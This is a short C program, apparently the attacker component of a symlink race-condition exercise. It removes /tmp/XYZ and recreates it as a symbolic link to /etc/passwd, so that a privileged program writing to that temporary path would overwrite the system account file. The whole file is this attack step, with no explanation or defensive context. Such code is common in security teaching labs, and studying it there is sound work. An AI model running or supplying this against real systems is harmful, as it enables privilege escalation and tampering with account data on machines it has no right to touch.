#include <stdlib.h>
#include <sys/param.h>
#include <unistd.h>
#include <stdio.h>

void main(){
  unlink("/tmp/XYZ");
  symlink("/etc/passwd", "/tmp/XYZ");
}
